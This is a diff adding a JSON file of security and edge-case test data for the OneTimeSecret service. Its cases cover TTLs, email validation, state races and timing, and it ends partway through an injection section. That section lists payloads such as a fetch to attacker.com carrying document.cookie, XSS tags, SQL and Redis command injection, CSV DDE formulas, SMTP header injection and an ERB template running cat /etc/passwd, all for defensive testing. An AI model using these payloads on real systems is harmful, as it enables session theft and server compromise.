@@ -1,0 +1,1190 @@
+{
+  "meta": {
+    "description": "Comprehensive test data for OneTimeSecret - each test case targets specific bugs",
+    "created": "2025-11-23",
+    "categories": [
+      "secret_creation_edge_cases",
+      "customer_validation_bugs",
+      "metadata_state_conflicts",
+      "timing_attacks",
+      "injection_attempts",
+      "encryption_edge_cases",
+      "ttl_boundary_violations",
+      "multi_tenancy_issues"
+    ]
+  },
+
+  "test_cases": {
+    "secret_creation_edge_cases": [
+      {
+        "id": "SEC-001",
+        "name": "Empty secret with passphrase protection",
+        "data": {
+          "custid": "test@example.com",
+          "secret_value": "",
+          "passphrase": "SecurePass123!",
+          "ttl": 7200
+        },
+        "assumption_violated": "System assumes secrets always have content if passphrase is set",
+        "what_breaks": "decrypt_value would attempt to decrypt empty string, triggering OpenSSL::Cipher::CipherError in Ruby 3.1. Encryption mode -1 logic prevents this but naive implementations crash",
+        "verification": "Check that value_encryption == -1 and decrypted_value returns empty string without errors"
+      },
+      {
+        "id": "SEC-002",
+        "name": "Secret exactly at 1MB boundary",
+        "data": {
+          "custid": "test@example.com",
+          "secret_value": "[1MB of 'A' characters - 1048576 bytes]",
+          "note": "Generate 1MB string programmatically in test: 'A' * 1048576",
+          "passphrase": null,
+          "ttl": 604800
+        },
+        "assumption_violated": "Off-by-one error: systems often use > instead of >= for size checks",
+        "what_breaks": "If size check uses `if value.length > max_size` instead of `>=`, exactly 1MB secrets bypass validation and overflow storage or break encryption",
+        "verification": "Verify truncation logic activates at exactly max size, not just above it"
+      },
+      {
+        "id": "SEC-003",
+        "name": "Unicode RTL override injection",
+        "data": {
+          "custid": "test@example.com",
+          "secret_value": "password123\u202E\u0000admin",
+          "passphrase": null,
+          "ttl": 86400
+        },
+        "assumption_violated": "Display code assumes text direction is LTR and null bytes don't exist in UTF-8 strings",
+        "what_breaks": "RTL override (U+202E) makes text render backwards ('nimdA\\0password123'), hiding malicious content. Null bytes can break C-based string functions in logging/monitoring",
+        "verification": "Check that secret renders correctly in UI without hiding content via direction manipulation"
+      },
+      {
+        "id": "SEC-004",
+        "name": "Passphrase with SQL injection attempt",
+        "data": {
+          "custid": "test@example.com",
+          "secret_value": "sensitive data",
+          "passphrase": "'; DROP TABLE secrets;--",
+          "ttl": 7200
+        },
+        "assumption_violated": "Passphrase is safely stored but might be logged or used in database queries without sanitization",
+        "what_breaks": "If passphrase is ever logged unsanitized or used in raw SQL/Redis commands, could expose injection vulnerability. Redis command injection possible if passphrase used in EVAL scripts",
+        "verification": "Ensure passphrase is hashed/encrypted before storage and never used in raw commands"
+      },
+      {
+        "id": "SEC-005",
+        "name": "TTL at exact minimum boundary minus one",
+        "data": {
+          "custid": "test@example.com",
+          "secret_value": "test",
+          "passphrase": null,
+          "ttl": 59
+        },
+        "assumption_violated": "Validation assumes TTL enforcement happens, but logic might silently clamp instead of rejecting",
+        "what_breaks": "BaseSecretAction.process_ttl clamps to min_ttl (60s) without error. User creates secret thinking it expires in 59s but it's actually 60s. Silent data corruption",
+        "verification": "Check if TTL < min_ttl raises error OR is clamped (document which behavior is expected)"
+      },
+      {
+        "id": "SEC-006",
+        "name": "Negative TTL value",
+        "data": {
+          "custid": "test@example.com",
+          "secret_value": "test",
+          "passphrase": null,
+          "ttl": -1
+        },
+        "assumption_violated": "TTL is always positive; negative values might bypass validation",
+        "what_breaks": "to_i on negative values stays negative. If expiration calculation is `created + ttl`, negative TTL creates instant expiration OR past timestamp, breaking Redis EXPIRE command or causing immediate deletion",
+        "verification": "Ensure negative TTL either raises error or is clamped to minimum valid value"
+      },
+      {
+        "id": "SEC-007",
+        "name": "TTL at maximum boundary plus one",
+        "data": {
+          "custid": "test@example.com",
+          "secret_value": "test",
+          "passphrase": null,
+          "ttl": 1209601
+        },
+        "assumption_violated": "Max TTL enforcement might not work if plan.options[:ttl] is nil or misconfigured",
+        "what_breaks": "If plan.options[:ttl] is nil, max_ttl fallback is 7.days (604800). Value > max_ttl gets clamped but user expects 14 days. Silent data corruption of user intent",
+        "verification": "Verify ttl > max_ttl is rejected or clamped with clear user feedback"
+      },
+      {
+        "id": "SEC-008",
+        "name": "Secret with only whitespace characters",
+        "data": {
+          "custid": "test@example.com",
+          "secret_value": "   \t\n\r\n   ",
+          "passphrase": null,
+          "ttl": 7200
+        },
+        "assumption_violated": "Empty check uses `secret_value.to_s.empty?` which doesn't catch whitespace-only strings",
+        "what_breaks": "ConcealSecret.raise_concerns checks `secret_value.to_s.empty?` but whitespace passes. Creates useless secret that wastes storage and confuses users. Should check `secret_value.to_s.strip.empty?`",
+        "verification": "Check if whitespace-only secrets are rejected or stored (document expected behavior)"
+      },
+      {
+        "id": "SEC-009",
+        "name": "Base64-encoded secret that looks encrypted",
+        "data": {
+          "custid": "test@example.com",
+          "secret_value": "U2FsdGVkX19QqVZ9qKz2eQ8vJkL5K5K5K5K5K5K5K5K=",
+          "passphrase": null,
+          "ttl": 7200
+        },
+        "assumption_violated": "Double encryption detection: user provides pre-encrypted data, system encrypts again",
+        "what_breaks": "User might encrypt secret client-side then send to server. Server encrypts again. When decrypted, recipient gets encrypted blob instead of plaintext. No validation for already-encrypted data",
+        "verification": "Document that client-side encryption is not supported or detect base64/encrypted patterns"
+      },
+      {
+        "id": "SEC-010",
+        "name": "Secret with newlines tabs and control characters",
+        "data": {
+          "custid": "test@example.com",
+          "secret_value": "line1\nline2\ttab\rcarriage\u0000null\u0007bell\u001bESC[31mred",
+          "passphrase": null,
+          "ttl": 7200
+        },
+        "assumption_violated": "Display code assumes no control characters; logging assumes safe ASCII",
+        "what_breaks": "Control characters like ESC can inject terminal escape sequences. In logs: `\\u001b[31m` turns following text red, hiding malicious content. Null bytes break C string functions. Bell (\\u0007) triggers audible alerts in terminals",
+        "verification": "Ensure control characters are escaped in logs and UI display, not executed as terminal commands"
+      }
+    ],
+
+    "customer_validation_bugs": [
+      {
+        "id": "CUST-001",
+        "name": "Email at minimum valid length",
+        "data": {
+          "custid": "a@b.c",
+          "email": "a@b.c",
+          "role": "customer",
+          "verified": "false"
+        },
+        "assumption_violated": "Email validation regex might require longer TLD or username",
+        "what_breaks": "Regex `/\\b[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,4}\\b/` requires TLD 2-4 chars. Single-char TLD '.c' barely passes if it exists. But modern TLDs can be longer (e.g., .museum is 6 chars). Regex fails for valid .museum emails",
+        "verification": "Check if TLD validation allows modern long TLDs or rejects a@b.museum incorrectly"
+      },
+      {
+        "id": "CUST-002",
+        "name": "Email at maximum length (254 chars)",
+        "data": {
+          "custid": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb.ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc.dddddddddddddddddddddddddddddddddddddddddddddddddddddddd.com",
+          "email": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb.ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc.dddddddddddddddddddddddddddddddddddddddddddddddddddddddd.com",
+          "role": "customer",
+          "verified": "false"
+        },
+        "assumption_violated": "Email storage or hashing has implicit length limits",
+        "what_breaks": "Redis strings handle this fine, but email used in encryption_key via SHA256. If any code truncates email before hashing, encryption keys differ between creation and retrieval, making secrets unreadable",
+        "verification": "Ensure email used consistently without truncation in all encryption/hashing operations"
+      },
+      {
+        "id": "CUST-003",
+        "name": "Email with plus-tag addressing",
+        "data": {
+          "custid": "user+tag+test@example.com",
+          "email": "user+tag+test@example.com",
+          "role": "customer",
+          "verified": "false"
+        },
+        "assumption_violated": "Email normalization might strip +tags, breaking uniqueness",
+        "what_breaks": "Many systems treat user+tag@domain and user@domain as same mailbox. If customer lookup normalizes email by stripping +tags, multiple accounts collapse to one, causing authentication and secret ownership bugs",
+        "verification": "Verify that user+tag1 and user+tag2 are treated as distinct custids or normalized consistently"
+      },
+      {
+        "id": "CUST-004",
+        "name": "International domain with unicode",
+        "data": {
+          "custid": "user@例え.jp",
+          "email": "user@例え.jp",
+          "role": "customer",
+          "verified": "false"
+        },
+        "assumption_violated": "Email regex only handles ASCII domains",
+        "what_breaks": "Regex `/[a-zA-Z0-9.-]+/` for domain part rejects Unicode. Valid IDN (Internationalized Domain Names) like user@例え.jp fail validation even though they're legitimate. Should support punycode (xn--) encoding",
+        "verification": "Check if IDN emails are rejected or if they need punycode conversion (user@xn--r8jz45g.jp)"
+      },
+      {
+        "id": "CUST-005",
+        "name": "Case sensitivity trap - mixed case email",
+        "data": {
+          "custid": "User@DOMAIN.com",
+          "email": "User@DOMAIN.com",
+          "role": "customer",
+          "verified": "false"
+        },
+        "assumption_violated": "Email comparison is case-sensitive, breaking RFC 5321 (local-part can be case-sensitive but domain must be case-insensitive)",
+        "what_breaks": "If customer lookup is case-sensitive, User@DOMAIN.com != user@domain.com creates duplicate accounts. Leads to: user can't login with different casing, secrets are owned by wrong account variant, email deliverability issues",
+        "verification": "Verify email normalization: downcase before storage or comparison, especially for domain part"
+      },
+      {
+        "id": "CUST-006",
+        "name": "Anonymous customer creating secrets",
+        "data": {
+          "custid": "anon",
+          "email": "anon",
+          "role": "customer",
+          "secrets_to_create": 1000
+        },
+        "assumption_violated": "Anonymous users have no rate limiting beyond IP-based limits",
+        "what_breaks": "Anonymous customer has custid='anon' (frozen object). All anon users share this instance. If rate limiting is per-custid, all anonymous users share same counter - one user's abuse blocks all others. Or conversely, no per-user tracking allows abuse",
+        "verification": "Check rate limiting for anon is IP-based not custid-based, since all share custid='anon'"
+      },
+      {
+        "id": "CUST-007",
+        "name": "Customer with suspicious status flag",
+        "data": {
+          "custid": "suspicious@example.com",
+          "email": "suspicious@example.com",
+          "role": "customer",
+          "status": "suspicious",
+          "verified": "true"
+        },
+        "assumption_violated": "Status field exists in spec but not in code - might be orphaned field or missing feature",
+        "what_breaks": "Requirement mentions 'status: enabled|disabled|suspicious' but Customer model has no status field. Either: spec is wrong, feature not implemented, or status stored elsewhere. Missing status checks allow suspended users to create secrets",
+        "verification": "Clarify if status field exists. If not, how are disabled/suspicious accounts handled?"
+      },
+      {
+        "id": "CUST-008",
+        "name": "Customer role manipulation to admin",
+        "data": {
+          "custid": "hacker@example.com",
+          "email": "hacker@example.com",
+          "role": "colonel",
+          "verified": "true"
+        },
+        "assumption_violated": "Role validation on customer creation might allow privileged roles",
+        "what_breaks": "Customer.create forces role='customer' but direct instantiation or update might allow role='colonel'. If role checks use `role?('colonel')` without validating how role was set, privilege escalation possible",
+        "verification": "Ensure role can only be set to valid values via authorized code paths, not user input"
+      },
+      {
+        "id": "CUST-009",
+        "name": "Customer destroying self multiple times",
+        "data": {
+          "custid": "delete@example.com",
+          "email": "delete@example.com",
+          "role": "customer",
+          "verified": "true",
+          "operations": ["destroy_requested!", "destroy_requested!", "destroy_requested!"]
+        },
+        "assumption_violated": "Idempotency not guaranteed for destroy_requested!",
+        "what_breaks": "destroy_requested! sets TTL to 365 days, role='user_deleted_self', regenerates apitoken. Called multiple times: apitoken regenerates each time (breaks existing tokens), TTL resets (delays deletion), verified flips repeatedly. No guard for already-deleted state",
+        "verification": "Add guard: return early if role?('user_deleted_self') to make operation idempotent"
+      },
+      {
+        "id": "CUST-010",
+        "name": "Customer with nil custid attempting save",
+        "data": {
+          "custid": null,
+          "email": null,
+          "role": "customer"
+        },
+        "assumption_violated": "Init defaults custid to 'anon' but direct field manipulation might bypass",
+        "what_breaks": "init sets `custid ||= 'anon'` but if custid set to nil after init, save crashes. Anonymous check `custid.to_s.eql?('anon')` converts nil to '' not 'anon', bypassing protection. Could save nil custid to Redis",
+        "verification": "Ensure custid cannot be nil after initialization, add validation in save method"
+      }
+    ],
+
+    "metadata_state_conflicts": [
+      {
+        "id": "META-001",
+        "name": "Metadata without corresponding secret",
+        "data": {
+          "metadata": {
+            "custid": "test@example.com",
+            "state": "new",
+            "secret_key": "nonexistent_secret_key_12345",
+            "secret_ttl": 7200,
+            "lifespan": 14400
+          },
+          "secret": null
+        },
+        "assumption_violated": "spawn_pair guarantees metadata and secret exist together",
+        "what_breaks": "If secret manually deleted but metadata remains, load_secret returns nil. Code calling metadata.load_secret.decrypted_value crashes with NoMethodError. orphaned! should handle this but requires detection logic everywhere",
+        "verification": "Check all code paths calling load_secret handle nil return gracefully or call orphaned!"
+      },
+      {
+        "id": "META-002",
+        "name": "Secret state burned but metadata state viewed",
+        "data": {
+          "metadata": {
+            "custid": "test@example.com",
+            "state": "viewed",
+            "secret_key": "test_secret_key_001",
+            "viewed": 1700000000
+          },
+          "secret": {
+            "custid": "test@example.com",
+            "state": "burned",
+            "key": "test_secret_key_001"
+          }
+        },
+        "assumption_violated": "Secret and metadata states are always synchronized",
+        "what_breaks": "Race condition: secret.burned! and metadata.burned! are separate calls. Network failure between them causes state mismatch. UI shows 'viewed' but secret is destroyed. User clicks 'View Secret' expecting content but gets 'Secret not found' error",
+        "verification": "Use Redis transactions (MULTI/EXEC) to update both states atomically or add reconciliation job"
+      },
+      {
+        "id": "META-003",
+        "name": "Metadata in new state with view_count > 0",
+        "data": {
+          "metadata": {
+            "custid": "test@example.com",
+            "state": "new",
+            "secret_key": "test_secret_key_002"
+          },
+          "secret": {
+            "custid": "test@example.com",
+            "state": "new",
+            "key": "test_secret_key_002",
+            "view_count": 5
+          }
+        },
+        "assumption_violated": "State transitions enforce view_count invariants",
+        "what_breaks": "view_count is a separate Redis counter, can be manually incremented. If counter > 0 but state='new', logic checking `maxviews?` (view_count >= 1) blocks viewing even though state says unviewed. Contradictory state breaks business logic",
+        "verification": "Ensure view_count only incremented via viewed!/received! state transitions, not directly"
+      },
+      {
+        "id": "META-004",
+        "name": "Metadata TTL shorter than secret TTL",
+        "data": {
+          "metadata": {
+            "custid": "test@example.com",
+            "secret_key": "test_secret_key_003",
+            "secret_ttl": 7200,
+            "lifespan": 3600
+          },
+          "secret": {
+            "custid": "test@example.com",
+            "key": "test_secret_key_003",
+            "lifespan": 7200
+          }
+        },
+        "assumption_violated": "Metadata always outlives secret (metadata TTL = secret TTL * 2)",
+        "what_breaks": "save_secret sets `metadata.ttl = ttl*2` but if manually overridden, metadata expires before secret. User accesses secret link after metadata expires: metadata.load returns nil, can't display passphrase prompt or track recipient, but secret still exists and is exposed",
+        "verification": "Add validation: metadata TTL must be >= secret TTL, or use getter that calculates dynamically"
+      },
+      {
+        "id": "META-005",
+        "name": "Secret received but viewed timestamp not set",
+        "data": {
+          "metadata": {
+            "custid": "test@example.com",
+            "state": "received",
+            "secret_key": "",
+            "received": 1700000000,
+            "viewed": null
+          }
+        },
+        "assumption_violated": "Received state implies prior viewed state",
+        "what_breaks": "received! allows transition from new->received OR viewed->received. If new->received directly (via API), viewed timestamp never set. Analytics relying on 'time between viewed and received' break. Reports show null viewed time",
+        "verification": "Enforce viewed! must be called before received! or auto-set viewed timestamp in received!"
+      },
+      {
+        "id": "META-006",
+        "name": "Burned secret with future burned timestamp",
+        "data": {
+          "metadata": {
+            "custid": "test@example.com",
+            "state": "burned",
+            "secret_key": "",
+            "burned": 2000000000,
+            "created": 1700000000
+          }
+        },
+        "assumption_violated": "Burned timestamp is always >= created timestamp and <= current time",
+        "what_breaks": "burned! uses `Time.now.utc.to_i` but if system clock adjusted backwards or timestamp manually set, burned can be in future. UI showing 'burned in 3 months' breaks user trust. Reports on burn rate miscount future timestamps",
+        "verification": "Validate timestamp is reasonable: created <= burned <= Time.now + tolerance (e.g., 1 hour)"
+      },
+      {
+        "id": "META-007",
+        "name": "Metadata with 1000+ recipient emails",
+        "data": {
+          "metadata": {
+            "custid": "test@example.com",
+            "secret_key": "test_secret_key_004",
+            "recipients": "[1000+ emails - generate programmatically: (1..1000).map{|i| \"user#{i}@example.com\"}.join(', ')]",
+            "note": "Test with extremely long recipients string to check memory/display limits"
+          }
+        },
+        "assumption_violated": "Recipients field has reasonable size limit",
+        "what_breaks": "deliver_by_email limits to 10 recipients but recipients field is freeform string. If API allows setting recipients directly, can store megabytes of email addresses. Redis memory explosion, slow JSON serialization, UI breaks rendering huge recipient list",
+        "verification": "Validate recipients field max length (e.g., 1KB) or max count before storage"
+      },
+      {
+        "id": "META-008",
+        "name": "Circular reference - owner as recipient",
+        "data": {
+          "metadata": {
+            "custid": "owner@example.com",
+            "secret_key": "test_secret_key_005",
+            "recipients": "owner@example.com"
+          }
+        },
+        "assumption_violated": "Recipient validation prevents sending to self",
+        "what_breaks": "No validation prevents user from sending secret to their own email. Use case: reminder/backup. But can cause: email delivery loops if forwarding rules exist, confusion in analytics (secrets_created vs secrets_shared both increment), notification spam",
+        "verification": "Decide if self-sending is allowed. If not, add validation: recipient != custid"
+      },
+      {
+        "id": "META-009",
+        "name": "Expired secret with active metadata showing new state",
+        "data": {
+          "metadata": {
+            "custid": "test@example.com",
+            "state": "new",
+            "secret_key": "test_secret_key_006",
+            "secret_ttl": 7200,
+            "created": 1600000000
+          },
+          "secret": null,
+          "current_time": 1700000000
+        },
+        "assumption_violated": "Expired secrets are always marked as expired state",
+        "what_breaks": "Secret TTL expires, Redis auto-deletes secret, but metadata lingers with state='new'. secret_expired? returns true but state still 'new'. User clicks link, UI says 'new secret' but backend can't load it. Confusion and poor UX",
+        "verification": "Before displaying metadata, check secret_expired? and auto-call expired! if true"
+      },
+      {
+        "id": "META-010",
+        "name": "Metadata state regressing from burned to viewed",
+        "data": {
+          "metadata": {
+            "custid": "test@example.com",
+            "state": "burned",
+            "secret_key": "",
+            "burned": 1700000000
+          },
+          "attempted_operation": "viewed!",
+          "expected_result": "no-op due to guard"
+        },
+        "assumption_violated": "State transition guards prevent regression",
+        "what_breaks": "viewed! has guard `return unless state?(:new)` preventing regression. BUT if metadata.state manually set to 'viewed' bypassing method, state regresses. Or if custom code calls state! directly. Corrupted audit trail, analytics broken",
+        "verification": "Make state field private, only modifiable via transition methods with guards. Add validation"
+      }
+    ],
+
+    "timing_attacks": [
+      {
+        "id": "TIME-001",
+        "name": "Secret created with future timestamp",
+        "data": {
+          "secret": {
+            "custid": "test@example.com",
+            "created": 2000000000,
+            "updated": 2000000000,
+            "lifespan": 7200
+          },
+          "current_time": 1700000000
+        },
+        "assumption_violated": "Created timestamp is always <= current time",
+        "what_breaks": "If created is future timestamp, expiration = created + lifespan is also future. Secret expires 'in 300 million seconds' (10 years). Effectively permanent secret bypassing TTL limits. Denial of service via storage exhaustion",
+        "verification": "Validate created timestamp: must be within reasonable range of Time.now (±1 hour for clock skew)"
+      },
+      {
+        "id": "TIME-002",
+        "name": "TTL expiration exactly at midnight UTC",
+        "data": {
+          "secret": {
+            "custid": "test@example.com",
+            "created": 1700000000,
+            "lifespan": 7200,
+            "expires_at": "2025-11-24T00:00:00Z"
+          }
+        },
+        "assumption_violated": "Expiration checks handle boundary times correctly",
+        "what_breaks": "If expiration check runs at exactly midnight UTC due to cron job, race condition: is_expired? compares `Time.now.to_i >= expiration`. If both are 1700008200, secret expires. But if check happens 1ms before midnight, not expired yet. Flaky tests and inconsistent behavior",
+        "verification": "Ensure expiration logic uses >= not > and handles exact boundary correctly with tolerance"
+      },
+      {
+        "id": "TIME-003",
+        "name": "DST transition moment - spring forward",
+        "data": {
+          "secret": {
+            "custid": "test@example.com",
+            "created": 1710054000,
+            "lifespan": 7200,
+            "note": "Created 2024-03-10 01:00:00 EST, expires during 2am->3am DST transition"
+          }
+        },
+        "assumption_violated": "All timestamps are UTC, no DST issues",
+        "what_breaks": "Code uses Time.now.utc.to_i (correct), but if any timezone conversion happens (logs, user display), DST creates confusion. User in EST sees 'expires at 2:30am' but that time doesn't exist (clock jumps 2am->3am). Display shows invalid time",
+        "verification": "Ensure all time storage and expiration logic stays in UTC, only convert to local for display"
+      },
+      {
+        "id": "TIME-004",
+        "name": "Leap second handling - June 30 23:59:60",
+        "data": {
+          "secret": {
+            "custid": "test@example.com",
+            "created": 1719791999,
+            "lifespan": 1,
+            "note": "Created at 2024-06-30 23:59:59, expires during leap second"
+          }
+        },
+        "assumption_violated": "Unix timestamps don't account for leap seconds",
+        "what_breaks": "Unix time is monotonically increasing but OS may smear leap second or repeat timestamp. If expiration calculation happens during leap second, Time.now.to_i might return same value twice. Expiration check flakes or is delayed by 1 second",
+        "verification": "Accept that leap seconds are handled by OS. Use >= in comparisons, add 1s tolerance in tests"
+      },
+      {
+        "id": "TIME-005",
+        "name": "Created timestamp greater than updated timestamp",
+        "data": {
+          "secret": {
+            "custid": "test@example.com",
+            "created": 1700001000,
+            "updated": 1700000000
+          }
+        },
+        "assumption_violated": "Updated timestamp is always >= created timestamp",
+        "what_breaks": "If system clock goes backwards between create and update, or manual timestamp manipulation, created > updated. Code calculating age using `updated - created` gets negative value. UI shows 'secret is -1000 seconds old', sorts oldest-first show newest secrets",
+        "verification": "Validate updated >= created when saving. Use max(created, updated) for age calculations"
+      },
+      {
+        "id": "TIME-006",
+        "name": "View timestamp race condition",
+        "data": {
+          "metadata": {
+            "custid": "test@example.com",
+            "state": "new",
+            "viewed": null
+          },
+          "concurrent_requests": ["request_1_at_1700000000.100", "request_2_at_1700000000.200"]
+        },
+        "assumption_violated": "Only one viewer accesses secret",
+        "what_breaks": "Two users click secret link simultaneously. Both see state='new', both call viewed! Guard prevents second call from changing state, but both get secret content. First clicks 'View', calls received!, destroys secret. Second user has decrypted content in memory but secret is gone. Burn-after-read violated",
+        "verification": "Use Redis WATCH/MULTI/EXEC or Lua script to make state check+transition atomic"
+      },
+      {
+        "id": "TIME-007",
+        "name": "Metadata outliving secret by exactly 2x TTL boundary",
+        "data": {
+          "metadata": {
+            "custid": "test@example.com",
+            "secret_ttl": 7200,
+            "lifespan": 14400,
+            "created": 1700000000
+          },
+          "secret": null,
+          "current_time": 1700014400
+        },
+        "assumption_violated": "Metadata TTL calculation is exact 2x secret TTL",
+        "what_breaks": "At exactly metadata expiration (created + 14400), race condition: is metadata expired? If comparison uses >= it's expired. If check runs at 1700014400.001, expired. But if Redis EXPIRE scheduled at same second, both might try to delete. Double-free or metadata briefly visible after intended expiration",
+        "verification": "Add small buffer (1s) to metadata TTL: `(secret_ttl * 2) + 1` to ensure clean expiration order"
+      },
+      {
+        "id": "TIME-008",
+        "name": "Integer overflow in TTL calculation - year 2038",
+        "data": {
+          "secret": {
+            "custid": "test@example.com",
+            "created": 2147483647,
+            "lifespan": 7200,
+            "note": "Created at max 32-bit Unix timestamp (2038-01-19)"
+          }
+        },
+        "assumption_violated": "32-bit integer overflow handled by Ruby's automatic bignum",
+        "what_breaks": "Ruby auto-converts to bignum so `2147483647 + 7200 = 2147490847` works. But if timestamp passed to C extension, 32-bit OS, or serialized to JSON as 32-bit int, overflow causes negative timestamp or crash. Redis EXPIRE uses seconds as int",
+        "verification": "Test on 32-bit systems or check if Redis handles timestamps > 2^31-1 correctly"
+      },
+      {
+        "id": "TIME-009",
+        "name": "Concurrent view and burn operations",
+        "data": {
+          "secret": {
+            "custid": "test@example.com",
+            "state": "new",
+            "key": "test_secret_key_007"
+          },
+          "operations": [
+            {"time": "1700000000.100", "operation": "reveal_secret"},
+            {"time": "1700000000.200", "operation": "burn_secret"}
+          ]
+        },
+        "assumption_violated": "State transitions are serialized",
+        "what_breaks": "User clicks 'View Secret' (starts reveal_secret). Before received! completes, owner clicks 'Burn'. Burn checks state='new' (still), calls burned!. Then reveal completes, calls received!. Both transitions succeed, but final state depends on timing. Race: either received or burned, audit trail incomplete",
+        "verification": "Use optimistic locking or distributed lock (Redis SETNX) to serialize state transitions"
+      },
+      {
+        "id": "TIME-010",
+        "name": "Clock skew between Redis and app server",
+        "data": {
+          "redis_time": 1700000000,
+          "app_server_time": 1700003600,
+          "secret": {
+            "custid": "test@example.com",
+            "created": 1700000000,
+            "lifespan": 7200
+          }
+        },
+        "assumption_violated": "All servers have synchronized clocks",
+        "what_breaks": "App server clock is 1 hour ahead of Redis. App checks `Time.now.to_i >= expiration` at 1700003600, thinks secret expired at 1700007200 (not yet). Shows 'expired' error. But Redis EXPIRE uses its own clock, secret still exists. Inconsistent state between app and Redis",
+        "verification": "Use Redis TIME command for expiration checks instead of app server Time.now, or monitor clock skew"
+      }
+    ],
+
+    "injection_attempts": [
+      {
+        "id": "INJ-001",
+        "name": "XSS in recipient email field",
+        "data": {
+          "recipient": "<script>alert(document.cookie)</script>@domain.com",
+          "custid": "test@example.com",
+          "secret_value": "test"
+        },
+        "assumption_violated": "Email validation prevents script tags",
+        "what_breaks": "Regex `/\\b[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,4}\\b/` extracts 'alert@domain.com' from input, stripping <script> tags. BUT if recipient field stored without validation and displayed in HTML without escaping, XSS payload executes. Email metadata shows script in raw form",
+        "verification": "Ensure all email display contexts HTML-escape recipients field, even though regex should sanitize"
+      },
+      {
+        "id": "INJ-002",
+        "name": "Path traversal in share_domain",
+        "data": {
+          "custid": "test@example.com",
+          "secret_value": "test",
+          "share_domain": "../../etc/passwd"
+        },
+        "assumption_violated": "Domain validation prevents non-domain strings",
+        "what_breaks": "CustomDomain.valid? checks domain format. Path traversal fails validation, process_share_domain returns early. BUT if validation is bypassed or loosened, share_domain used in URL construction: `[scheme, share_domain].join`. Creates URL `https://../../etc/passwd/secret/key` which might bypass security checks",
+        "verification": "Confirm CustomDomain.valid? rejects path traversal and special characters, not just regex match"
+      },
+      {
+        "id": "INJ-003",
+        "name": "Redis command injection in identifier",
+        "data": {
+          "identifier": "secret:test\\r\\nDEL secrets\\r\\nSET hacked 1",
+          "custid": "test@example.com"
+        },
+        "assumption_violated": "Familia library escapes Redis keys properly",
+        "what_breaks": "If identifier used in raw Redis command without escaping, newlines (\\r\\n) inject commands. Familia generates IDs safely, but if ID from user input, could inject DEL/SET/FLUSHDB. Familia uses RESP protocol which escapes this, but Lua EVAL scripts might be vulnerable",
+        "verification": "Ensure all user-provided IDs are validated against safe pattern (alphanumeric only) before use"
+      },
+      {
+        "id": "INJ-004",
+        "name": "HTML injection in secret content",
+        "data": {
+          "custid": "test@example.com",
+          "secret_value": "<img src=x onerror=alert(1)> <iframe src=javascript:alert(document.domain)>",
+          "passphrase": null,
+          "ttl": 7200
+        },
+        "assumption_violated": "Secret content is displayed as plain text, not rendered as HTML",
+        "what_breaks": "If UI renders secret_value in HTML context without escaping, <img> and <iframe> tags execute JavaScript. Stored XSS. Attacker shares secret link, victim views it, malicious script steals session cookie or performs actions as victim",
+        "verification": "Ensure secret_value displayed in <pre> or <textarea> or with HTML escaping, never as innerHTML"
+      },
+      {
+        "id": "INJ-005",
+        "name": "JavaScript in secret content for client-side eval",
+        "data": {
+          "custid": "test@example.com",
+          "secret_value": "'); fetch('https://attacker.com?cookie=' + document.cookie); //",
+          "passphrase": null,
+          "ttl": 7200
+        },
+        "assumption_violated": "Secret content never passed to eval() or used in JavaScript context",
+        "what_breaks": "If client-side code does `var secret = '${secret_value}';` without escaping quotes, attacker's payload breaks out of string context. Or if content used in eval(secret_value), direct code execution. Extremely dangerous if secret shown in JS",
+        "verification": "Never use secret_value in JavaScript string contexts. Always JSON.stringify() or use data attributes"
+      },
+      {
+        "id": "INJ-006",
+        "name": "CSV injection in metadata export",
+        "data": {
+          "metadata": {
+            "custid": "test@example.com",
+            "recipients": "=1+1+cmd|'/c calc'!A1",
+            "memo": "@SUM(1+1)*cmd|'/c notepad'"
+          }
+        },
+        "assumption_violated": "CSV export sanitizes formulas",
+        "what_breaks": "If metadata exported to CSV and opened in Excel, fields starting with =@+- are treated as formulas. =1+1 calculates to 2 (harmless). But =cmd|'/c calc' executes calc.exe on Windows (DDE attack). Attacker-controlled recipient/memo fields become code execution",
+        "verification": "Prefix =@+- characters with single quote (') when exporting to CSV to force text interpretation"
+      },
+      {
+        "id": "INJ-007",
+        "name": "LDAP injection in customer email lookup",
+        "data": {
+          "email": "user*)(objectClass=*",
+          "custid": "user*)(objectClass=*"
+        },
+        "assumption_violated": "Email used in LDAP queries is sanitized",
+        "what_breaks": "If LDAP integration exists for customer lookup, email in query like `(mail=${email})` without escaping becomes `(mail=user*)(objectClass=*)` which always matches. LDAP injection allows bypassing authentication or dumping directory info. Currently no LDAP code visible, but risky if added",
+        "verification": "If LDAP integration planned, escape special chars: * ( ) \\ NULL before using email in LDAP filters"
+      },
+      {
+        "id": "INJ-008",
+        "name": "SMTP header injection in recipient field",
+        "data": {
+          "recipient": "victim@example.com\\nBcc: attacker@evil.com\\nSubject: Hacked",
+          "custid": "test@example.com",
+          "secret_value": "test"
+        },
+        "assumption_violated": "Email library prevents header injection",
+        "what_breaks": "If email address passed to SMTP library without validation, newlines inject headers. Recipient becomes 'victim@example.com', BCC attacker@evil.com', Subject changes. Email library should escape this, but if raw SMTP used, allows sending to arbitrary BCC addresses, spamming",
+        "verification": "Ensure email library (ActionMailer?) strips newlines from addresses or use modern library that prevents injection"
+      },
+      {
+        "id": "INJ-009",
+        "name": "Template injection in memo field",
+        "data": {
+          "metadata": {
+            "memo": "{{7*7}} <%= system('cat /etc/passwd') %> ${7*7}",
+            "custid": "test@example.com"
+          }
+        },
+        "assumption_violated": "Memo is plain text, not processed as template",
+        "what_breaks": "If memo field rendered through ERB/Liquid/Mustache template engine without escaping, template syntax executes. ERB: `<%= system('cmd') %>` runs arbitrary shell commands on server. Mustache: `{{7*7}}` evaluates to 49. Leads to RCE if memo used in email templates",
+        "verification": "Never pass user input (memo, recipient) to template engines. Pre-escape or use safe templates"
+      },
